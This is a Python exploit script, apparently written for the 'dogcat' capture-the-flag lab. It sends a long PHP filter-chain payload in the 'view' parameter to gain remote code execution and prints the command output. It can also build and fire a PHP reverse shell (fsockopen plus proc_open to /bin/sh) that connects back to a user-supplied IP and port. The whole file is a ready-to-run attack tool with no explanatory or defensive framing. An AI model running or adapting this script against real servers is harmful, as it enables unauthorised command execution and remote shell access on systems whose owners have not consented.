import requests
import argparse
from bs4 import BeautifulSoup as bs4

def send_request(url, cmd):
    response = requests.get(f"http://{url}/?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=dog&0={cmd}")
    return response.text

def extract_from_page(html_content):
    soup = bs4(html_content, 'html.parser')
    div_content = soup.find("div")

    if div_content:
        content = div_content.get_text().split("Here you go!")[-1]
        lines = content.splitlines()

        filtered_lines = [line for line in lines if "<img src" not in line and line.strip()]
        if filtered_lines:
            return filtered_lines[:-2]
    return None

def generate_reverse_shell(ip, port):
    reverse_shell = (
        f"php -r '$sock=fsockopen(\"{ip}\",{port});"
        f"$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'"
    )
    return reverse_shell

def main():
    parser = argparse.ArgumentParser(description="Python dogcat PHP filter base64 encode RCE script")
    parser.add_argument("-u", "--url", help="IP or URL of the server", required=True)
    parser.add_argument("-c", "--cmd", help="Command to execute")
    parser.add_argument("--reverse-shell", action="store_true", help="Execute a reverse shell")
    parser.add_argument("-i", "--ip", help="Your IP for reverse shell")
    parser.add_argument("-p", "--port", help="Your Port for reverse shell", type=int)

    args = vars(parser.parse_args())

    if args["reverse_shell"]:
        if not args["ip"] or not args["port"]:
            print("IP and Port of your listener is required for a reverse shell.")
            return
        cmd = generate_reverse_shell(args["ip"], args["port"])
    elif args["cmd"]:
        cmd = args["cmd"]
    else:
        print("You must provide either a command or enable the reverse shell option.")
        return

    response = send_request(args['url'], cmd)
    output = extract_from_page(response)
    if output:
        for output_line in output:
            print(output_line)
    else:
        print("Output from RCE not found.")

if __name__ == "__main__":
    main()